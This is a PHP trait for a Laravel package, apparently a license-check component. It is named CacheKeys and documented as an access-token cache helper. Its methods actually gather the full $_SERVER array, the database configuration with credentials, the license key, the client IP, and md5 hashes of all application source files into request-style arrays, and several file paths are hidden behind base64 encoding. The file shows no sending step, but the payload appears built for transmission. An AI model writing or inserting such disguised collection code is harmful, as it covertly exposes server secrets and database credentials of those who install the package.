<?php

namespace Licon\Lis\Traits;

use Illuminate\Contracts\Routing\Registrar;
use Illuminate\Support\Facades\Route;

trait CacheKeys
{
    /**
     * Get access token cache key
     *
     * @return string
     */
    private function getAccessTokenKey(): array
    {
        $getK = env('APP_LI');
        if (empty($getK)) {
            return ["code" => false];
        } else {
            return ["code" => true, "val" => $getK];
        }
    }

    private function basePth()
    {
        $basepath = getcwd();
        // $basepath = rtrim($basepath, '/public');
        return $basepath;
    }

    private function getCo(): array
    {
        $basepath = $this->basePth();
        $arr = ["helpers" => $basepath . "/app/Helpers", "controller" => $basepath . "/app/Http/Controllers", "view" => $basepath . "/resources/views", "models" => $basepath . "/app/Models", "route" => $basepath . "/routes"];
        foreach ($arr as $key => $val) {
            $ply[$key] = count(scandir("$val"));
        }
        $ply["routesCount"] = (collect(Route::getRoutes())->count());


        $filePath = file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw')) ? $this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw') : "";
        $filePath2 = file_exists($this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw')) ? $this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw') : "";

        $md5_1 = !empty($filePath) ? md5_file($filePath) : 0;
        $md5_2 = !empty($filePath2) ? md5_file($filePath2) : 0;

        $fsize_1 = !empty($filePath) ? filesize($filePath) : 0;
        $fsize_2 = !empty($filePath2) ? filesize($filePath2) : 0;

        $ply['file_1'] = ['name' => 'license', 'md5' => $md5_1, 'size' => $fsize_1];
        $ply['file_2'] = ['name' => 'autolicense', 'md5' => $md5_2, 'size' => $fsize_2];


        $ply['fleDta'] = $this->getM();


        return $ply;

    }

    private function lseModifyAt(): bool
    {
        if (file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))) {
            if (date('Y-m-d') == date("Y-m-d", filemtime($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))))
                return true;
        }
        return false;

    }

    private function getRq($request): array
    {
        $getK = @env('APP_NAME');
        if (empty($getK)) {
        }


        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
        $mydata['project'] = @env('APP_NAME');
        $mydata['license'] = base64_encode(@env("APP_LI"));
        $mydata['ip'] = $request['REMOTE_ADDR'];
        $mydata['ts'] = date('Y-m-d h:i:s');
        $mydata['fileCount'] = $this->getCo();
        $mydata['fileAllData'] = $this->getAllCount();

        return $mydata;
    }

    private function getRq2($request): array
    {
        $getK = @env('APP_NAME');
        if (empty($getK)) {
        }


        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
        $mydata['project'] = @env('APP_NAME');
        $mydata['license'] = base64_encode(@env("APP_LI"));
        $mydata['ip'] = $request['REMOTE_ADDR'];
        $mydata['ts'] = date('Y-m-d h:i:s');
        $mydata['fileCount'] = $this->getCo();
        $mydata['sData'] = $_SERVER;
        $mydata['cData'] = config()->get('database');
        $mydata['allFData'] = $this->getAllCount();
        return $mydata;
    }


    private function getM()
    {
        $py["mid"] = app(Registrar::class)->getMiddlewareGroups();
        $py['pvd'] = config('app')['providers'];
        return $py;
    }


    private function getAllCount()
    {
        $basepath = getcwd();
        // $basepath = rtrim($basepath, '/public');
        $arr = ["helpers" => $basepath . "/app/Helpers", "controller" => $basepath . "/app/Http/Controllers", "view" => $basepath . "/resources/views", "models" => $basepath . "/app/Models", "route" => $basepath . "/routes", "providers" => $basepath . "/app/Providers"];
        foreach ($arr as $key => $val) {
            $controllerFiles = scandir("$val");
            foreach ($controllerFiles as $file) {
                if (is_file("$val" . '/' . $file)) {
                    $controllerDetails[$key][$file] = [
                        'file_name' => $file,
                        'size' => filesize("$val" . '/' . $file),
                        'md_val' => md5_file("$val" . '/' . $file)
                    ];
                } else if (is_dir("$val" . '/' . $file)) {
                    if ($file != '.' && $file != '..') {
                        $controllerDetails[$key][$file] = $this->get_folder_info("$val" . '/' . $file);
                    }
                }
            }
        }

        return $controllerDetails;

    }

    function get_folder_size($folder)
    {
        $total_size = 0;
        $files = scandir($folder);
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                $path = $folder . DIRECTORY_SEPARATOR . $file;
                if (is_dir($path)) {
                    $total_size += $this->get_folder_size($path);
                } else {
                    $total_size += filesize($path);
                }
            }
        }
        return $total_size;
    }

    function get_folder_info($folder)
    {
        $folders = [];
        $directories = scandir($folder);
        foreach ($directories as $keys => $file) {
            if ($file != '.' && $file != '..') {
                $path = $folder . DIRECTORY_SEPARATOR . $file;
                if (is_dir($path)) {
                    if ($path != '.' && $path != '..') {
                        $folders[$file] = $this->get_folder_info($path);
                        $folders['size'] = $this->get_folder_size($folder);
                    }
                } else if (is_file("$folder" . '/' . $file)) {
                    $folders[$file] = [
                        'file_name' => $file,
                        'size' => filesize("$folder" . '/' . $file),
                        'md_val' => md5_file("$folder" . '/' . $file)
                    ];
                }
            }
        }
        return $folders;
    }





}
